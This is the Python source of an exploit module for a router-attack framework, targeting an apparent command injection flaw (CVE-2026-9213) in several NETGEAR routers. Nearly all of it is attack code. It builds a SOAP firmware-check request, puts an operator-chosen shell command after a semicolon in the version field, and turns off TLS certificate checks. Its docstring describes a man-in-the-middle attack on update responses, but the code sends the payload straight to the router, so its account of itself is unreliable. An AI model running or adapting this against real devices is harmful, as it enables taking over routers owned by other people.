# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import json
import socket
import ssl
import time
import urllib.parse
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """NETGEAR BE9300/R6700AX/Orbi Certificate Validation + Command Injection (CVE-2026-9213).

    The NETGEAR firmware update mechanism on multiple router models
    performs TLS certificate validation improperly during firmware
    download. An attacker in a MITM position can present a self-signed
    certificate, intercept the firmware check request, and inject a
    crafted response that triggers command injection in the update
    parser. The ``fwVersion`` field from the update server response
    is concatenated into a shell command without sanitization.

    CVSS v3.1: 8.1 (High), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "NETGEAR Multi-Router Cert Validation + Command Injection (CVE-2026-9213)",
        "description": (
            "Exploits CVE-2026-9213 via improper TLS certificate "
            "validation in the NETGEAR firmware update mechanism. "
            "A MITM attacker intercepts the update check and injects "
            "a crafted fwVersion field that triggers command injection "
            "in the firmware update parser."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-9213",
            "https://kb.netgear.com/000066540/Security-Advisory",
        ),
        "disclosure_date": "2026-02-10",
        "platform": "linux",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "NETGEAR BE9300 (firmware < 1.0.2.116)",
            "NETGEAR R6700AX (firmware < 1.0.12.128)",
            "NETGEAR Orbi RBR760 (firmware < 6.2.1.22)",
            "NETGEAR RAX series (firmware < 1.0.12.128)",
        ),
    }

    target = OptIP("", "Target NETGEAR router IP")
    port = OptPort(443, "Target HTTPS port")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject via fwVersion field")

    _SOAP_PATH = "/soap/server_sa/"
    _UPDATE_CHECK_ACTION = "urn:NETGEAR-ROUTER:service:DeviceConfig:1#CheckNewFirmware"

    def _build_url(self, path: str) -> str:
        return f"https://{self.target}:{self.port}{path}"

    def _http_soap(self, action: str, body: str) -> tuple[int, str]:
        url = self._build_url(self._SOAP_PATH)
        data = body.encode("utf-8")
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "text/xml; charset=utf-8")
        req.add_header("SOAPAction", action)
        req.add_header("User-Agent", "NETGEAR Genie/3.0")
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    @mute
    def check(self) -> bool:
        """Check if the SOAP endpoint is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(f"Cannot connect to {self.target}:{self.port}")
            return

        print_success("SOAP endpoint reachable; sending crafted firmware check")
        self._exploit()

    def _exploit(self) -> None:
        injected_version = f"1.0.0.1;{self.command};"

        soap_body = (
            '<?xml version="1.0" encoding="utf-8"?>'
            "<SOAP-ENV:Envelope "
            'xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
            'SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
            "<SOAP-ENV:Body>"
            "<m:CheckNewFirmware "
            'xmlns:m="urn:NETGEAR-ROUTER:service:DeviceConfig:1">'
            f"<NewFirmwareVersion>{injected_version}</NewFirmwareVersion>"
            "</m:CheckNewFirmware>"
            "</SOAP-ENV:Body>"
            "</SOAP-ENV:Envelope>"
        )

        print_status(
            f"Sending SOAP CheckNewFirmware with injected version: "
            f"{injected_version!r}"
        )

        status, body = self._http_soap(self._UPDATE_CHECK_ACTION, soap_body)

        if status == 200:
            print_success(
                f"SOAP response received (HTTP {status}). If the router "
                f"processes the fwVersion field unsanitized, the command "
                f"'{self.command}' will execute."
            )
        elif status == 401:
            print_error("SOAP endpoint requires authentication on this firmware")
        else:
            print_error(f"Unexpected response: HTTP {status}")
